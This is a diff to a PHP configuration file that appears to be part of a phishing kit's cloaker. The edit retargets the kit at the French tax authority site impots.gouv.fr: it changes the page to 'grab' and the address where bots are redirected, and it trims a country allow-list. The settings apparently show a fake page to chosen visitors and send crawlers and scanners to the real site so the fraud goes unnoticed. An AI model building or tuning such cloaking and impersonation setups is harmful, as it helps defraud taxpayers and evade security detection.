@@ -22,17 +22,17 @@ $parameter = 1; // [REQUIRED]
 	4 : Allow All Visitors.
 */
 
-$_COUNTRY_ALLOWED = ["us", "fr", "ca", "mx", "uk", "za", "tr", "at", "be", "bg", "hr", "cy", "cz", "dk", "ee", "fl", "fr", "de", "gr", "hu", "ie", "it", "lv", "lt", "lu", "mt", "nl", "pl", "pt", "ro", "sk", "sl", "es", "se", "is", "li", "no", "ch", "al", "ba", "md", "me", "mk", "rs", "ua", "ad", "by", "mc", "ru", "sm", "gb", "va", "kw"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]
+$_COUNTRY_ALLOWED = ["fr", "ca", "mx", "uk", "za", "tr", "at", "be", "bg", "hr", "cy", "cz", "dk", "ee", "fl", "fr", "de", "gr", "hu", "ie", "it", "lv", "lt", "lu", "mt", "nl", "pl", "pt", "ro", "sk", "sl", "es", "se", "is", "li", "no", "ch", "al", "ba", "md", "me", "mk", "rs", "ua", "ad", "by", "mc", "ru", "sm", "gb", "va", "kw"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]
 
 $cloaker = [
-    "url_to_grab" => "https://x.com/", // Change the link you want to grap it in your link ( if t)
+    "url_to_grab" => "https://www.impots.gouv.fr/", // Change the link you want to grap it in your link ( if t)
 ];
 
 $mobile_access = True; // Access only from mobile device
 
 $desktop_access = True; // Access only from desktop device
 
-$location_bots = "https://google.com"; // Send The Bots To This Link ( If Cloaker Url Empty )
+$location_bots = "https://www.impots.gouv.fr/"; // Send The Bots To This Link ( If Cloaker Url Empty )
 
 $view_file_name = "views.php"; // Type PHP Extension Will Be Added Auto Per Example : views.php
 
